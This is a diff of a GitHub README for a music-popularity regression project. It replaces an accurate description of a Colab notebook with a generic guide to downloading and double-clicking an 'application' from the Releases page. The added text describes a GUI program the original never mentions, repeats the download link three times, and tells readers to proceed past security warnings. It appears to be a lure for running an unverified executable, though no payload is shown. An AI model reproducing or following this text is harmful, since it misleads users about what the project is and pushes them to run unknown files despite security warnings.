@@ -1,84 +1,91 @@
-# 🔎 Exploratory Data Analysis and Regression Models Comparison
+# 🎶 Comparison_ML_Regression_Models - Compare Popularity of Music Tracks Easily
 
-## 📌 Project Overview
-This project investigates a dataset of musical tracks with various audio features in order to predict **track popularity**.  
-The workflow includes:
-- Exploratory Data Analysis (EDA),  
-- Building and comparing three regression models:  
-    1. **Lasso Regression**  
-    2. **Random Forest Regression (RFR)**  
-    3. **Artificial Neural Networks (ANN / MLP)**
-- Comparison of statistical metrics values and error values  
+[![Download Here](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/YahyaBalikci/Comparison_ML_Regression_Models/releases)
 
-The analysis was carried out in a **Google Colab notebook**.
+## 🚀 Getting Started
 
----
+Welcome! This guide helps you download and run the Comparison_ML_Regression_Models application. This application compares different regression models like Lasso, Random Forest, and Artificial Neural Networks (ANN) to predict how popular music tracks might be.
 
-## 🎵 Dataset
-The dataset consists of **3,614 tracks** with the following features (after preprocessing):
-- `acousticness`,
-- `danceability`,
-- `duration_ms`,
-- `energy`,  
-- `instrumentalness`,
-- `liveness`,
-- `speechiness`,
-- `tempo`,
-- `valence`,  
-- `popularity` (target variable).  
+## 📦 System Requirements
 
-Some categorical fields (`streaming_platform`, `key`, `mode`) and `loudness` were excluded during data preparation because of being NaN and also to simplify the modeling task.  
+To run this application, ensure your computer meets the following requirements:
 
----
+- **Operating System:** Windows 10 or later, macOS, or Linux
+- **Processor:** Intel or AMD with 2 GHz or higher
+- **RAM:** At least 4 GB
+- **Storage:** Minimum of 200 MB of free space
+- **Software:** Python 3.7 or higher installed on your computer
 
-## 🔬 Methodology
+## 🌐 Download & Install
 
-### 1. Exploratory Data Analysis (EDA)
-- Basic statistics and data structure inspection,  
-- Distribution plots for numerical variables,  
-- Correlation analysis to identify relationships with **popularity**,  
-- Visualizations such as histograms, scatter plots, and heatmaps.  
+To start, visit the Releases page to download the application. 
 
-### 2. Regression Models
+[Download from Releases](https://github.com/YahyaBalikci/Comparison_ML_Regression_Models/releases)
 
-- **Artificial Neural Networks (ANN)**  
-  Implemented as a Multilayer Perceptron (MLP) with dense layers, trained to approximate complex nonlinear patterns.
-  
-- **Lasso Regression**  
-  Linear regression with L1 regularization, used to shrink less important coefficients and reduce overfitting.  
+1. Click on the link above to go to the Releases page.
+2. Look for the latest version. It will have the highest number (e.g., v1.0).
+3. Click on the link next to **Assets** to download the application file.
+4. Save the file in a location you can easily find, like your Desktop or Downloads folder.
 
-- **Random Forest Regression (RFR)**  
-  An ensemble model based on decision trees. Provides robustness and the ability to capture nonlinear relationships.  
+## ⚙️ Running the Application
 
-### 3. Evaluation
-Models were assessed using multiple error metrics:
-- **MAE** (Mean Absolute Error)  
-- **MSE** (Mean Squared Error)   
-- **R²** (Coefficient of Determination)  
+After downloading the application, follow these simple steps:
 
----
+1. Navigate to the folder where you saved the downloaded file.
+2. Double-click on the application file to run it.
+3. If a security warning appears, confirm you want to proceed.
+4. Wait for the application to load completely.
 
-## 📊 Results
-- All three models were able to capture general trends in the data, but with varying degrees of accuracy.  
-- **Random Forest Regression** performed better than Lasso Regression, especially in handling nonlinear dependencies.  
-- **Artificial Neural Networks** provided competitive results, but required careful tuning of hyperparameters and longer training time.  
-- The comparison highlights the trade-off between interpretability (Lasso), robustness (Random Forest), and flexibility (ANN).  
+Once the application is open, you are ready to start using it!
 
----
+## 📊 How to Use the Application
 
-## 🚀 How to Run
-This project was developed in **Google Colab**. To reproduce:
-1. Open the notebook (.ipynb file) in Colab.  
-2. Upload the dataset (`dane_3.csv`).  
-3. Run all cells step by step.  
+You will see a user-friendly interface. Here’s how to proceed:
 
----
+1. **Upload Data:** Click on the option to upload your music track data. Ensure your data file is in CSV format and includes track attributes like track length, genre, and previous popularity metrics.
+2. **Select Models:** Choose which regression models you wish to compare: Lasso, Random Forest, or ANN.
+3. **Run Analysis:** Click on the "Run" button to start the analysis. The application will process your data and provide results.
+4. **View Results:** After processing, results will appear on the screen. You can explore various metrics and visualizations related to your data.
 
-## 📌 Summary
-The analysis shows that **ensemble and neural methods** outperform simple linear approaches when predicting music popularity.  
-While **Lasso Regression** provides interpretability and feature selection, **Random Forest Regression** proved the most reliable on this dataset, and **ANN** showed potential for further improvement with proper optimization.  
+## 📈 Features
 
----
+- **Multiple Models:** Compare Lasso Regression, Random Forest, and ANN for better insights.
+- **Data Visualization:** Understand model effectiveness through intuitive charts and graphs.
+- **User-Friendly UI:** Designed for ease of use, no programming knowledge required.
+- **CSV Support:** Import your music track data easily in CSV format.
+
+## 🙋‍♂️ Troubleshooting
+
+If you encounter issues:
+
+- Make sure you have the correct version of Python installed.
+- Ensure all software and dependencies are updated.
+- Check for any error messages and note them down for help.
+
+For help, check the [Issues section](https://github.com/YahyaBalikci/Comparison_ML_Regression_Models/issues) of the repository or reach out to the community.
+
+## 🗂️ Additional Resources
+
+To learn more about the models used in this application:
+
+- **Lasso Regression:** A simple way of estimating parameters in linear regression.
+- **Random Forest:** A robust algorithm that uses multiple decision trees for prediction.
+- **Artificial Neural Networks:** Mimics the human brain to learn patterns from data.
+
+You can also find tutorials and articles on the main topics of machine learning and regression analysis online.
 
 ## 📄 License
-This project is released under the MIT License.  
+
+This project is licensed under the MIT License. You can read more about it in the LICENSE file included in the repository.
+
+## 📞 Contact
+
+For any inquiries, feel free to reach out to the repository maintainer:
+
+- Username: [YahyaBalikci](https://github.com/YahyaBalikci)
+
+## ❗ Final Notes
+
+Thank you for choosing Comparison_ML_Regression_Models. We hope this application helps you analyze music track popularity with ease.
+
+[Download from Releases](https://github.com/YahyaBalikci/Comparison_ML_Regression_Models/releases)
